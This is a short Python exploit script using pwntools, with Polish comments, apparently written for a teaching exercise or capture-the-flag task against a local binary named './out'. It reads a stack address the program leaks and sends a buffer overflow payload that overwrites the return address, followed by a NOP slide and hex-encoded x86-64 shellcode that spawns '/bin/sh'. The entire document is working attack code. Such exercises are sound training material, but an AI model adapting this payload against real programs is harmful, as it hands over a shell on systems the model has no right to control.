from pwn import *
# Uruchomienie programu
p = process("./out");
# Na samym poczatku program wyswietla adres miejsca na stosie
# (pozycja zmiennej "v" w ramach ramki stosu funkcji "main")
# Wykorzystamy go pozniej w naszym exploicie
p.readuntil("Stack:")
stack_ptr = int(p.readuntil("\n").strip(), 16)
p.readuntil("Hello adventurer, state your name\n")
# Teraz program czeka na wejscie
# === Tu wprowadzamy modyfikacje ===
# =================================
name = "Alicja\x00aaaaa"
name += '\x90'*8 # rbp
name += p64(stack_ptr) # rip
# NOP slide
name += '\x90' * 128
shellcode = unhex("4831f65648bf2f62696e2f2f736857545f6a3b58990f05")

name += shellcode
#gdb.attach(p)
# Wysylamy dane
p.sendline(name)
# ...i odbieramy odpowiedz programu
print(p.readall())

